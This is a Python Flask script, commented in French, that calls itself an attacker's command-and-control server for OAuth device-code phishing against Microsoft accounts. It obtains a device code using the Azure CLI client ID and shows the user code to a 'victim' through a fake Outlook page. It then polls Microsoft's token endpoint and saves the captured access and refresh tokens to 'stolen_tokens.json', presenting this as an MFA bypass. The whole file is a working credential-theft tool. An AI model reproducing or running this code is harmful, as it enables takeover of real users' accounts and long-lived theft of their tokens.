from flask import Flask, jsonify, send_from_directory
from flask_cors import CORS
import requests
import json

app = Flask(__name__)
CORS(app)
clientApp="ecd6b820-32c2-49b6-98a6-444530e5a77a"
sessions = {
    '25370': {'status': 'pending', 'device_code': None}
}

# --- ÉTAPE 1 : API v2.0 ---
@app.route('/api/get-code', methods=['GET'])
def get_code():
    print("\n[SYSTEM] Génération d'un nouveau code de piégeage...")
    
    payload = {
        "client_id": clientApp, # Azure CLI
        "scope": "offline_access user.read" # offline_access est crucial pour avoir le Refresh Token
    }
    
    try:
        # Passage sur l'API v2.0
        ms_response = requests.post("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", data=payload)
        ms_data = ms_response.json()
        
        if "user_code" in ms_data:
            sessions['25370']['device_code'] = ms_data['device_code']
            sessions['25370']['status'] = 'pending'
            
            print(f"[SYSTEM] Code à afficher à la victime : {ms_data['user_code']}")
            return jsonify({"user_code": ms_data['user_code']})
        else:
            print(f"[ERREUR MS] {ms_data}")
            return jsonify({"error": "Erreur API MS"}), 500
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# --- ÉTAPE 2 : Interrogation du token (API v2.0) ---
@app.route('/api/status/<session_id>', methods=['GET'])
def get_status(session_id):
    session = sessions.get(session_id, {'status': 'unknown'})
    
    if session.get('status') == 'pending' and session.get('device_code'):
        
        payload = {
            "client_id": clientApp,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "device_code": session['device_code']
        }
        
        try:
            # Passage sur l'API v2.0
            ms_resp = requests.post("https://login.microsoftonline.com/common/oauth2/v2.0/token", data=payload)
            token_data = ms_resp.json()
            
            if "access_token" in token_data:
                session['status'] = 'captured' 
                
                print("\n" + "="*60)
                print("[!!! ALERTE FATALE !!!] AUTHENTIFICATION MFA CONTOURNÉE")
                print("="*60)
                
                with open("stolen_tokens.json", "w") as f:
                    json.dump(token_data, f, indent=4)
                
                print("[INFO] Les jetons ont été sauvegardés dans 'stolen_tokens.json'")
                print("="*60 + "\n")

            elif token_data.get("error") == "authorization_pending":
                pass 
                
            elif token_data.get("error") == "slow_down":
                print("[ATTENTION] Microsoft demande de ralentir (slow_down) - Le JS poll trop vite.")
                
            elif token_data.get("error") == "expired_token":
                session['status'] = 'expired'
                print("\n[INFO] Le code a expiré.")
                
            elif token_data.get("error") == "access_denied":
                session['status'] = 'declined'
                print("\n[ÉCHEC] La victime a annulé l'opération.")
                
            else:
                # TRÈS IMPORTANT : S'il y a une erreur de configuration de compte (ex: Conditional Access), ça s'affichera ici.
                print(f"[DEBUG MICROSOFT] {token_data}")

        except Exception as e:
            print(f"[ERREUR RÉSEAU] {e}")

    return jsonify({'status': session.get('status', 'unknown')})

@app.route('/')
def serve_html():
    return send_from_directory('.', 'outlook.html')

if __name__ == '__main__':
    print("SERVEUR C2 ATTAQUANT (OAUTH PHISHING v2.0) EN ÉCOUTE SUR LE PORT 3000")
    app.run(host='0.0.0.0', port=3000, debug=False)
